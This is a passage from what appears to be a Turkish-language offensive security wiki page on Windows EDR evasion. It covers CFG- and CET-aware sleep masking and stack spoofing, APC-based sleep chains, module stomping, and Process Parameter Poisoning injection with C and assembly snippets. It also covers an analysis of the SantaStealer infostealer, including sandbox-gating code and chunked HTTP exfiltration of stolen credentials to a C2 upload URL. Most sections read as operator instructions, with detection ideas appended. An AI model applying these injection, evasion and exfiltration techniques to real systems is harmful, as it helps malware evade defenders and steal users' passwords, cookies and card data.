- Yüklü image'lerdeki (`ntdll`, `kernel32`, `advapi32`) adresler için `MEMORY_RANGE_ENTRY`, **image base**'ten başlamalı ve **image'in tamamını** kapsamalıdır.
- Elle eşlenmiş/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size değerlerini kullanın.
- Yalnızca dispatch gadget'ını değil; dolaylı olarak erişilen export'ları (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target olacak, saldırganın kontrolündeki çalıştırılabilir bölümleri de işaretleyin.

Bu, ROP/JOP tarzı sleep zincirlerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan, `/guard:cf` ile derlenmiş `explorer.exe`, browser'lar, `svchost.exe` ve diğer endpoint'lerde kullanılabilir bir primitive'e dönüştürür.

### Uyuyan thread'ler için CET-safe stack spoofing

Tam `CONTEXT` değiştirme işlemi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş bir `Rip` değerinin donanım shadow stack'iyle uyuşması gerekir. Daha güvenli bir sleep-masking deseni şöyledir:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Geçerli thread'in gerçek TEB/TIB'sini yedekleyin.
- `GetThreadContext` ile gerçek uyku bağlamını yakalayın.
- Spoof bağlamına yalnızca gerçek `Rip` değerini kopyalayın; spoof edilmiş `Rsp`/stack durumunu olduğu gibi bırakın.
- Uyku aralığında, stack walker'ların geçerli bir stack aralığı içinde çözümleme yapması için spoof thread'inin `NT_TIB`'sini geçerli TEB'ye kopyalayın.
- Wait işlemi bittikten sonra özgün TIB'yi ve thread bağlamını geri yükleyin.

Bu, CET ile tutarlı bir instruction pointer'ı korurken çözümlemeleri doğrulamak için TEB stack metadata'sına güvenen EDR stack walker'larını yanıltır.

### APC tabanlı alternatif: Kraken Mask

Timer-queue dispatch fazla imzalıysa, aynı sleep-encrypt-spoof-restore dizisi kuyruklanmış APC'ler kullanılarak askıya alınmış bir yardımcı thread'den çalıştırılabilir:<sup>[[27]](#references)</sup>

- Giriş noktası `NtTestAlert` olan bir yardımcı thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack'ini tüketmemek için zincir durumunu yardımcı thread'in stack'i yerine heap'te saklayın.
- Başlangıç event'ini atomik olarak sinyallemek ve beklemek için `NtSignalAndWaitForSingleObject` kullanın.
- Stack'in yarı geri yüklenmiş durumdayken bir scanner'ın yakalama olasılığını azaltmak için TIB/bağlamı geri yüklemeden önce ana thread'i askıya alın (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını yardımcı thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Uyku, wait veya APC dispatch işlemlerinden kısa süre önce kullanılan `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory`.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` sonrasında geçerli thread'in TEB/TIB stack sınırlarına doğrudan yazılması.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-izin geri yükleme yardımcılarına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüllerde dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrar tekrar kullanılması.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine payload'ları hedef süreçte zaten eşlenmiş bir DLL'in **`.text` section'ından** çalıştırır. Üzerine yazılacak hedef, sürecin hâlâ ihtiyaç duyduğu kod yollarını bozmadan payload'ı barındırabilecek, **yüklenmiş ve disk destekli bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere gelişigüzel stomping uygulamak kırılgandır: DLL uzak süreçte yüklü olmayabilir ve kod bölgesinin çok küçük olması sürecin çökmesine neden olur. Daha güvenilir bir iş akışı şöyledir:

1. Hedef süreç modüllerini sıralayın ve hâlihazırda yüklenmiş DLL'lerin **yalnızca adlarını içeren** bir include list tutun.
2. Önce payload'ı oluşturun ve **tam byte boyutunu** kaydedin.
3. Aday DLL'leri diskte tarayın ve PE section'ındaki **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu, dosya boyutundan daha önemlidir; çünkü section'ın **belleğe eşlendiğindeki** boyutunu yansıtır.
4. **Export Address Table (EAT)**'i ayrıştırın ve stomp başlangıç offset'i olarak dışa aktarılan bir işlevin RVA değerini seçin.
5. **Blast radius**'u hesaplayın: payload seçilen işlevin sınırını aşarsa, bellekte onun ardından yerleştirilmiş bitişik export'ların üzerine yazar.

Gerçek ortamda görülen tipik recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasyonel notlar
- `LoadLibrary`/beklenmeyen image load telemetrisinden kaçınmak için uzak süreçte **zaten yüklenmiş** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'ler thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara erişebilir.
- Büyük implantlar, tam buffer'ın injector source içinde doğru şekilde temsil edilmesi için shellcode embedding yönteminin string literal'dan **byte-array/braced initializer** biçimine değiştirilmesini gerektirebilir.

Tespit fikirleri
- Daha yaygın olan private RWX/RX allocation'lar yerine **image-backed executable page'lere** (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write'lar.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk byte'ları kısa süre önce değiştirilmiş meşru bir DLL export'u içinde çalıştırmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine yönelik, ardından thread creation gelen şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write path'inden (`VirtualAllocEx` + `WriteProcessMemory`) kaçınan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe byte kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalayıp** bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması olgusundan yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan ve poison edilebilen taşıyıcılar

Kullanışlı taşıyıcılar:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Taşıyıcılarla ilgili pratik kısıtlamalar:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleği** işaret etmelidir ve null terminator dahil en fazla **32,767 Unicode karakter** uzunluğunda olabilir.
- `lpEnvironment`, ardışık `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak rezerve edilmiştir; bu nedenle `ShellInfo` eşlemesi, kararlı ve belgelenmiş bir sözleşme yerine bir uygulama ayrıntısı olarak değerlendirilmelidir.

Böylece normal process creation, **payload-transfer primitive**'ine dönüşür. Operatör, saldırganın kontrolündeki başlangıç verileriyle child process'i oluşturur ve cross-process kopyalamayı Windows'un yapmasını sağlar.

### Remote write API'leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **salt okunur** primitive'lerle bulun:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'i okuyun
3. `PEB.ProcessParameters`'ı izleyin
4. `RTL_USER_PROCESS_PARAMETERS`'ı okuyun
5. Seçilen pointer'ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre tamponunun yürütülmesi

Kopyalanan parametre bölgesi genellikle yürütülebilir değil, `RW` olur. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluşturun (askıya alınmış olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre sayfasını yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` tarafından zaten döndürülen ana iş parçacığı tanıtıcısını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i üzerine yazın) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak bu yöntem, `SuspendThread` / `ResumeThread` gerektirmez; döndürülen ana iş parçacığı tanıtıcısının bağlamı doğrudan değiştirilebilir.

Bu yöntem, injection için yaygın olarak izlenen çeşitli API'lerden kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` API'lerinden de

### Null byte sınırlaması ve aşamalı shellcode

Üç taşıyıcının da verisi **string veya string benzeri** olduğundan, `0x00` içeren ham bir payload aktarım sırasında kesilir. Kullanışlı bir çözüm, sabit değerleri çalışma zamanında yeniden oluşturan ve ardından keyfi bir ikinci aşamayı yükleyen **null içermeyen bir ilk aşama** kullanmaktır.

Basit bir yöntem, XOR tabanlı sabit sentezlemesidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, first stage'in aktarılan parametreye null byte eklemeden stack strings, API argümanları, DLL yolları veya second-stage shellcode loader oluşturmasını sağlar.

### First stage'den stack tabanlı API çağrıları

First stage'in `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'ine push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` register'larına sabit değerler veya `RSP`'ye göreli işaretçiler atamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

Ardından second stage stack'ten `PAGE_READWRITE` tahsisine kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX tahsisi yapmaktan kaçınmak için ona atlanabilir.

### Tespit fikirleri

Yazarların belirttiği iyi avlanma fırsatları:

- `VirtualProtectEx` / `NtProtectVirtualMemory` ile **process-parameter sayfalarının yürütülebilir** hale getirilmesi
- bu koruma değişikliğinin ardından `SetThreadContext` / `NtSetContextThread` çağrılması
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için uzak bellek okumaları
- süreç oluşturma sırasında alışılmadık derecede uzun / yüksek entropili `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, başlı başına tam bir execution primitive değil, **process'ler arası aktarım tekniğidir**: kopyalanan parametre hâlâ yürütme izni değişikliği ve execution redirection yöntemi gerektirir.
- `RtlCreateProcessReflection` / Dirty Vanity, yazarlar tarafından değerlendirildi ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere ulaştığı için reddedildi.

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access'i tek bir iş akışında nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Keyboard layout gating ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla yüklü keyboard layout'larını listeler. Bir Kiril düzeni bulunursa örnek boş bir `CIS` işaretçisi bırakır ve stealer'ları çalıştırmadan sonlanır; böylece hariç tutulan yerel ayarlarda asla tetiklenmezken avlanma için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- A varyantı süreç listesini tarar, her adı özel bir rolling checksum ile hash’ler ve sonucu debugger/sandbox’lar için gömülü blok listeleriyle karşılaştırır; bilgisayar adı üzerinde checksum işlemini tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- B varyantı sistem özelliklerini inceler (minimum süreç sayısı, yakın zamandaki uptime), VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping’i saptamak için sleep işlemlerinin çevresinde zamanlama kontrolleri gerçekleştirir. Herhangi bir eşleşme modüller başlatılmadan önce işlemi durdurur.

### Dosyasız helper + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium kimlik bilgisi helper’ı içerir; dosyasız modda helper hiçbir artifact yazılmaması için import’ları/relocation’ları kendi çözer.
- Bu helper, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki adet 32 baytlık anahtar + 12 baytlık nonce). Her iki şifre çözme işleminden sonra blob’u reflectively yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına inject etmek, AppBound Encryption anahtarlarını devralmak ve ABE hardening’e rağmen SQLite veritabanlarından parolaları/çerezleri/kredi kartlarını doğrudan decrypt etmek için direct-syscall reflective process hollowing kullanır.


### Modüler bellek içi toplama ve parçalı HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu dolaşır ve etkin her modül için (Telegram, Discord, Steam, ekran görüntüleri, belgeler, tarayıcı eklentileri vb.) bir thread başlatır. Her thread sonuçları paylaşılan buffer’lara yazar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey statik olarak linklenmiş `miniz` kütüphanesiyle `%TEMP%\\Log.zip` olarak sıkıştırılır. Ardından `ThreadPayload1` 15 saniye bekler ve arşivi, tarayıcıya ait `multipart/form-data` boundary’sini (`----WebKitFormBoundary***`) taklit ederek HTTP POST üzerinden 10 MB’lık parçalar hâlinde `http://<C2>:6767/upload` adresine gönderir. Her parça `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı olarak `w: <campaign_tag>` ekler; son parçaya ise C2’nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack’ler: malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Zero trust’ınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell’den önce: Storm-2603’ün önceki ransomware operasyonlarını inceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: forwarded export’ları kötüye kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referansı (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR’lara karşı koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect tekniğiyle Windows Defender’ın koruyucu kalkanını aşma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut referansı](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Saf perdenin ardında: RAT’ten builder’a, oradan coder’a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware’ini alt etme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uyuyan Güzel: Crystal Palace ile Adaptix’i uyutmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uyuyan Güzel II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW’nizi gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop’ı kötüye kullanma: Pratik bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender’ın remediation driver’ını kernel operation primitive olarak weaponize etme](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo yardımcı kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak kendini maskeleyen fonksiyonlar oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
